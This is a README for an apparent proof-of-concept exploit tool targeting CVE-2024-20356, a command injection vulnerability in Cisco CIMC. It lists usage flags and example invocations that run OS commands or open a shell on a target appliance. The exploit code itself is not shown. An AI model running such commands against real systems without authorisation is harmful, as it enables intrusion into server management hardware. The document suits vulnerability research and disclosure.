# CVE-2024-20356
This is a proof of concept for CVE-2024-20356, a Command Injection vulnerability in Cisco's CIMC.

Written by Aaron and Oxidised by Sherllyneo

Full technical details can be found at [https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom](https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom)

## Usage
```
Usage: CVE_2024_20356 [OPTIONS] --host <HOSTNAME>

Options:
  -t, --host <HOSTNAME>      Target hostname or IP address (format 10.0.0.1 or 10.0.0.2:1337)
  -u, --username <USERNAME>  Username [default: admin]
  -p, --password <PASSWORD>  Password [default: cisco]
  -a, --action <ACTION>      Action to perform [default: test] [possible values: test, cmd, shell, dance]
  -c, --cmd <CMD>            OS command to run [default: None]
  -v, --verbose              Displays more information about cimc
  -h, --help                 Print help
  -V, --version              Print version

```

Example commands:
```
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -v
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -c 'id'
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -a shell
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -a dance
```

Use the `--help` argument for full usage instructions.

## Disclaimer
This proof-of-concept is for demonstration purposes and should not be used for illegal activities. LRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.
